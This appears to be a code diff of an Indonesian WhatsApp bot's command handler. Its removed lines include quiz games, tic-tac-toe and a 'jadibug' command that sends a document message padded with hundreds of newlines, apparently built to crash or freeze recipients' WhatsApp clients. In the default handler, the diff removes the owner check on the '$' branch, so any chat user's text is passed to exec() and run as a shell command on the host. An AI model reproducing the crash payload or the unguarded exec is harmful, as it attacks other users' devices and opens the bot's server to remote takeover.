- let result = anu[Math.floor(Math.random() * anu.length)]
- let msg = await haikal.sendMessage(from, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, {quoted:m})
- haikal.sendText(from, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
- tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
- })
- await sleep(60000)
- if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
- console.log("Jawaban: " + result.jawaban)
- haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lagu`},{quoted:m}) 
- delete tebaklagu[m.sender.split('@')[0]]
- }
- } else if (args[0] === 'gambar') {
- if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
- let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
- let result = anu[Math.floor(Math.random() * anu.length)]
- haikal.sendImage(from, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
- tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
- })
- await sleep(60000)
- if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
- console.log("Jawaban: " + result.jawaban)
- haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak gambar`}, {quoted:m}) 
- delete tebakgambar[m.sender.split('@')[0]]
- }
- } else if (args[0] === 'kata') {
- if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
- let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
- let result = anu[Math.floor(Math.random() * anu.length)]
- haikal.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
- tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
- })
- await sleep(60000)
- if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
- console.log("Jawaban: " + result.jawaban)
- haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kata` }, {quoted:m}) 
- delete tebakkata[m.sender.split('@')[0]]
- }
- } else if (args[0] === 'kalimat') {
- if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
- let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
- let result = anu[Math.floor(Math.random() * anu.length)]
- haikal.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
- tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
- })
- await sleep(60000)
- if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
- console.log("Jawaban: " + result.jawaban)
- haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kalimat`}, {quoted:m}) 
- delete tebakkalimat[m.sender.split('@')[0]]
- }
- } else if (args[0] === 'lirik') {
- if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
- let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
- let result = anu[Math.floor(Math.random() * anu.length)]
- haikal.sendText(from, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
- tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
- })
- await sleep(60000)
- if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
- console.log("Jawaban: " + result.jawaban)
- haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lirik`} , {quoted:m}) 
- delete tebaklirik[m.sender.split('@')[0]]
- }
- } else if (args[0] === 'lontong') {
- if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
- let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
- let result = anu[Math.floor(Math.random() * anu.length)]
- haikal.sendText(from, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
- caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
-caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
- })
- await sleep(60000)
- if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
- console.log("Jawaban: " + result.jawaban)
- haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption:`Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lontong`}, {quoted:m}) 
- delete caklontong[m.sender.split('@')[0]]
-delete caklontong_desk[m.sender.split('@')[0]]
- }
- }
-}
-break
-//=================================================//
-case 'kuismath': case 'math': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
- if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
- let { genMath, modes } = require('./src/math')
- if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh Usersan: ${prefix}math medium`
- let result = await genMath(text.toLowerCase())
- haikal.sendText(from, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
- kuismath[m.sender.split('@')[0]] = result.jawaban
- })
- await sleep(result.waktu)
- if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
- console.log("Jawaban: " + result.jawaban)
- m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
- delete kuismath[m.sender.split('@')[0]]
- }
-}
-break
-//=================================================//
-case 'ttc': case 'ttt': case 'tictactoe': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
- let TicTacToe = require("./lib/tictactoe")
-this.game = this.game ? this.game : {}
-if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
-let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
-if (room) {
-m.reply('Partner ditemukan!')
-room.o = from
-room.game.playerO = m.sender
-room.state = 'PLAYING'
-let arr = room.game.render().map(v => {
-return {
-X: '❌',
-O: '⭕',
-1: '1️⃣',
-2: '2️⃣',
-3: '3️⃣',
-4: '4️⃣',
-5: '5️⃣',
-6: '6️⃣',
-7: '7️⃣',
-8: '8️⃣',
-9: '9️⃣',
-}[v]
-})
-let str = `Room ID: ${room.id}
-
-${arr.slice(0, 3).join('')}
-${arr.slice(3, 6).join('')}
-${arr.slice(6).join('')}
-
-Menunggu @${room.game.currentTurn.split('@')[0]}
-
-Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
-if (room.x !== room.o) await haikal.sendText(room.x, str, m, { mentions: parseMention(str) } )
-await haikal.sendText(room.o, str, m, { mentions: parseMention(str) } )
-} else {
-room = {
-id: 'tictactoe-' + (+new Date),
-x: from,
-o: '',
-game: new TicTacToe(m.sender, 'o'),
-state: 'WAITING'
-}
-if (text) room.name = text
-m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
-this.game[room.id] = room
-}
-}
-break
-//=================================================//
-case 'delttc': case 'delttt': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
- let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
-if (!roomnya) throw `Kamu sedang tidak berada di room tictactoe !`
-delete this.game[roomnya.id]
-m.reply(`Berhasil delete session room tictactoe !`)
-}
-break
-//=================================================//
-case 'suitpvp': case 'suit': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
-this.suit = this.suit ? this.suit : {}
-let poin = 10
-let poin_lose = 10
-let timeout = 60000
-if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
-if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
-if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, from, { mentions: [owner[1] + '@s.whatsapp.net'] })
-if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
-let id = 'suit_' + new Date() * 1
-let caption = `_*SUIT PvP*_
-
-@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit
-
-Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
-this.suit[id] = {
-chat: await haikal.sendText(from, caption, m, { mentions: parseMention(caption) }),
-id: id,
-p: m.sender,
-p2: m.mentionedJid[0],
-status: 'wait',
-waktu: setTimeout(() => {
-if (this.suit[id]) haikal.sendText(from, `_Waktu suit habis_`, m)
-delete this.suit[id]
-}, 60000), poin, poin_lose, timeout
-}
-}
-break
-//=================================================
-case 'jadibug': {
-if (!isCreator) return m.reply('*Special Premium*')
-if (!text) throw `Contoh : ${prefix + command} DUX BOT`
-let teks = `${text}`
-{
-var document = generateWAMessageFromContent(from, proto.Message.fromObject({
-"documentMessage": {
-"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
-"mimetype": "",
-"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
-"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
-"pageCount": 0,
-"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
-"fileName": `🔥 ${teks} ☆⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
-"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
-"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
-"mediaKeyTimestamp": "1658703206",
-"caption":` ${teks} ${buttonkal}`,
-}
-}), { userJid: from })
-haikal.relayMessage(from, document.message, { messageId: document.key.id })
-
-}
-}
-break
-
-case 'hapus':{
-haikal.sendMessage(m.chat,
-{
-delete: {
-remoteJid: m.chat,
-fromMe: false,
-id: m.quoted.id,
-participant: m.quoted.sender
-}
-})
-}
-break
-//=================================================
 default:
 if (budy.startsWith('=>')) {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 function Return(sul) {
 sat = JSON.stringify(sul, null, 2)
 bang = util.format(sat)
@@ -7298,7 +6783,7 @@ m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
 } catch (e) {
 m.reply(String(e))}}
 if (budy.startsWith('>')) {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 try {
 let evaled = await eval(budy.slice(2))
 if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
@@ -7306,14 +6791,13 @@ await m.reply(evaled)
 } catch (err) {
 await m.reply(String(err))}}
 if (budy.startsWith('$')) {
-if (!isCreator) return m.reply('*Special Premium*')
 exec(budy.slice(2), (err, stdout) => {
 if(err) return m.reply(err)
 if (stdout) return m.reply(stdout)})}
 //=================================================//
 if (isCmd && budy.toLowerCase() != undefined) {
-if (m.isBaileys) return
 if (from.endsWith('broadcast')) return
+if (m.isBaileys) return
 let msgs = global.db.data.database
 if (!(budy.toLowerCase() in msgs)) return
 haikal.copyNForward(from, msgs[budy.toLowerCase()], true)}}
